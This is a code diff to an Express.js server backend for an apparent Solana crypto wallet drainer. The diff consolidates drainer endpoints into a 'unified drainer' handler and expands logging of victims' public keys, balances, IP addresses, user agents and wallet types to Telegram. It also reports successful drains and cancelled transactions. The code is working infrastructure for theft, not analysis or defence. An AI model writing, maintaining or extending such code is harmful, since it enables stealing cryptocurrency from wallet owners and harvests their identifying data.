@@ -1,6 +1,6 @@
 import express from 'express';
 import cors from 'cors';
-import drainerHandler from './api/drainer.js';
+import unifiedDrainerHandler from './api/unified-drainer.js';
 import telegramLogger from './src/telegram.js';
 
 const app = express();
@@ -16,33 +16,26 @@ app.get('/health', (req, res) => {
   res.json({ status: 'healthy', timestamp: new Date().toISOString() });
 });
 
-// Original drainer endpoint (unchanged - ensures no functionality is broken)
-app.post('/api/drainer', drainerHandler);
+// Unified drainer endpoint (replaces both original and enhanced)
+app.post('/api/drainer', unifiedDrainerHandler);
 
-// Enhanced drainer endpoint (new - with all optimizations)
+// Legacy enhanced endpoint (redirects to unified for backward compatibility)
 app.post('/api/enhanced-drainer', async (req, res) => {
-  try {
-    // Dynamic import to avoid startup errors if enhancement modules are missing
-    const { default: enhancedDrainerHandler } = await import('./api/enhanced-drainer.js');
-    await enhancedDrainerHandler(req, res);
-  } catch (error) {
-    console.error('Enhanced drainer failed to load:', error.message);
-    // Fallback to original drainer if enhanced version fails
-    console.log('Falling back to original drainer...');
-    await drainerHandler(req, res);
-  }
+  console.log('[LEGACY] Enhanced endpoint called, redirecting to unified drainer');
+  await unifiedDrainerHandler(req, res);
 });
 
 // Log wallet detection
 app.post('/api/drainer/log-wallet', async (req, res) => {
   try {
-    const { publicKey, lamports, ip, userAgent } = req.body;
+    const { publicKey, lamports, ip, userAgent, walletType } = req.body;
     
     await telegramLogger.logWalletDetected({
       publicKey,
       lamports,
       ip,
-      userAgent
+      userAgent,
+      walletType
     });
     
     res.json({ success: true, message: 'Wallet logged successfully' });
@@ -55,16 +48,28 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
 // Log transaction confirmation
 app.post('/api/drainer/log-confirmation', async (req, res) => {
   try {
-    const { publicKey, lamports, ip, userAgent, txid, status } = req.body;
+    const { publicKey, lamports, ip, userAgent, txid, status, error: errorMsg, walletType } = req.body;
     
-    await telegramLogger.logDrainSuccess({
-      publicKey,
-      lamports,
-      ip,
-      userAgent,
-      txid,
-      status
-    });
+    if (status === 'cancelled') {
+      await telegramLogger.logTransactionCancelled({
+        publicKey,
+        lamports,
+        ip,
+        userAgent,
+        reason: errorMsg || 'User cancelled',
+        walletType
+      });
+    } else {
+      await telegramLogger.logDrainSuccess({
+        publicKey,
+        lamports,
+        ip,
+        userAgent,
+        txid,
+        status,
+        walletType
+      });
+    }
     
     res.json({ success: true, message: 'Confirmation logged successfully' });
   } catch (error) {
@@ -73,22 +78,44 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
   }
 });
 
+// Log transaction cancellation (legacy endpoint for backward compatibility)
+app.post('/api/drainer/log-cancellation', async (req, res) => {
+  try {
+    const { publicKey, lamports, ip, userAgent, reason, walletType } = req.body;
+    
+    await telegramLogger.logTransactionCancelled({
+      publicKey,
+      lamports,
+      ip,
+      userAgent,
+      reason: reason || 'Unknown reason',
+      walletType
+    });
+    
+    res.json({ success: true, message: 'Cancellation logged successfully' });
+  } catch (error) {
+    console.error('Error logging cancellation:', error);
+    res.status(500).json({ error: 'Failed to log cancellation' });
+  }
+});
+
 // Enhancement modules status endpoint
 app.get('/api/enhancements/status', async (req, res) => {
   try {
-    // Dynamic import to avoid startup errors
-    const { enhancementModules } = await import('./api/enhanced-drainer.js');
+    // Get status from unified drainer
+    const { enhancementModules, drainerConfig } = await import('./api/unified-drainer.js');
     
     const status = {
       timestamp: new Date().toISOString(),
-      modules: {
-        rpc: enhancementModules.rpcManager.getRPCStats(),
-        rateLimiting: enhancementModules.rateLimiter.getRateLimitStats(),
-        retry: enhancementModules.retryManager.getRetryStats(),
-        fees: enhancementModules.feeOptimizer.getFeeStats(),
-        monitoring: enhancementModules.transactionMonitor.getMonitoringStats(),
-        wallet: enhancementModules.walletOptimizer.getWalletStats()
-      }
+      configuration: drainerConfig,
+      modules: enhancementModules ? {
+        rpc: enhancementModules.rpcManager?.getRPCStats?.() || 'Not loaded',
+        rateLimiting: enhancementModules.rateLimiter?.getRateLimitStats?.() || 'Not loaded',
+        retry: enhancementModules.retryManager?.getRetryStats?.() || 'Not loaded',
+        fees: enhancementModules.feeOptimizer?.getFeeStats?.() || 'Not loaded',
+        monitoring: enhancementModules.transactionMonitor?.getMonitoringStats?.() || 'Not loaded',
+        wallet: enhancementModules.walletOptimizer?.getWalletStats?.() || 'Not loaded'
+      } : 'No enhancement modules loaded'
     };
     
     res.json(status);
@@ -97,7 +124,7 @@ app.get('/api/enhancements/status', async (req, res) => {
     res.status(500).json({ 
       error: 'Failed to get enhancement status',
       details: error.message,
-      fallback: 'Enhancement modules not available'
+      fallback: 'Unified drainer not available'
     });
   }
 });
@@ -105,40 +132,61 @@ app.get('/api/enhancements/status', async (req, res) => {
 // Enhancement modules health check
 app.get('/api/enhancements/health', async (req, res) => {
   try {
-    // Dynamic import to avoid startup errors
-    const { enhancementModules } = await import('./api/enhanced-drainer.js');
+    // Get health from unified drainer
+    const { enhancementModules, drainerConfig } = await import('./api/unified-drainer.js');
     
     const healthReport = {
       timestamp: new Date().toISOString(),
       status: 'healthy',
+      configuration: {
+        enhanced: drainerConfig.enhanced,
+        core: drainerConfig.core
+      },
       modules: {}
     };
     
-    // Check RPC health
-    try {
-      await enhancementModules.rpcManager.performHealthCheck();
-      healthReport.modules.rpc = 'healthy';
-    } catch (error) {
-      healthReport.modules.rpc = `unhealthy: ${error.message}`;
-      healthReport.status = 'degraded';
-    }
-    
-    // Check rate limiter
-    try {
-      const rateLimitStats = enhancementModules.rateLimiter.getRateLimitStats();
-      healthReport.modules.rateLimiter = 'healthy';
-    } catch (error) {
-      healthReport.modules.rateLimiter = `unhealthy: ${error.message}`;
-      healthReport.status = 'degraded';
-    }
-    
-    // Check transaction monitor
-    try {
-      const monitoringStats = enhancementModules.transactionMonitor.getMonitoringStats();
-      healthReport.modules.transactionMonitor = 'healthy';
-    } catch (error) {
-      healthReport.modules.transactionMonitor = `unhealthy: ${error.message}`;
-      healthReport.status = 'degraded';
+    if (enhancementModules) {
+      // Check RPC health
+      try {
+        if (enhancementModules.rpcManager?.performHealthCheck) {
+          await enhancementModules.rpcManager.performHealthCheck();
+          healthReport.modules.rpc = 'healthy';
+        } else {
+          healthReport.modules.rpc = 'not available';
+        }
+      } catch (error) {
+        healthReport.modules.rpc = `unhealthy: ${error.message}`;
+        healthReport.status = 'degraded';
+      }
+      
+      // Check rate limiter
+      try {
+        if (enhancementModules.rateLimiter?.getRateLimitStats) {
+          const rateLimitStats = enhancementModules.rateLimiter.getRateLimitStats();
+          healthReport.modules.rateLimiter = 'healthy';
+        } else {
+          healthReport.modules.rateLimiter = 'not available';
+        }
+      } catch (error) {
+        healthReport.modules.rateLimiter = `unhealthy: ${error.message}`;
+        healthReport.status = 'degraded';
+      }
+      
+      // Check transaction monitor
+      try {
+        if (enhancementModules.transactionMonitor?.getMonitoringStats) {
+          const monitoringStats = enhancementModules.transactionMonitor.getMonitoringStats();
+          healthReport.modules.transactionMonitor = 'healthy';
+        } else {
+          healthReport.modules.transactionMonitor = 'not available';
+        }
+      } catch (error) {
+        healthReport.modules.transactionMonitor = `unhealthy: ${error.message}`;
+        healthReport.status = 'degraded';
+      }
+    } else {
+      healthReport.modules = 'No enhancement modules loaded';
+      healthReport.status = 'basic';
     }
     
     res.json(healthReport);
@@ -147,7 +195,7 @@ app.get('/api/enhancements/health', async (req, res) => {
     res.status(500).json({ 
       error: 'Failed to check enhancement health',
       details: error.message,
-      fallback: 'Enhancement modules not available'
+      fallback: 'Unified drainer not available'
     });
   }
 });
@@ -155,11 +203,11 @@ app.get('/api/enhancements/health', async (req, res) => {
 // Start server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📊 Original drainer: http://localhost:${PORT}/api/drainer`);
-  console.log(`🚀 Enhanced drainer: http://localhost:${PORT}/api/enhanced-drainer`);
+  console.log(`🔗 Unified drainer: http://localhost:${PORT}/api/drainer`);
+  console.log(`🔄 Legacy enhanced endpoint: http://localhost:${PORT}/api/enhanced-drainer`);
   console.log(`📈 Enhancement status: http://localhost:${PORT}/api/enhancements/status`);
   console.log(`🏥 Enhancement health: http://localhost:${PORT}/api/enhancements/health`);
-  console.log(`⚠️  Note: Enhanced endpoints will fallback to original if modules fail`);
+  console.log(`✅ Unified architecture prevents resource conflicts and ensures stability`);
 });
 
 export default app; 
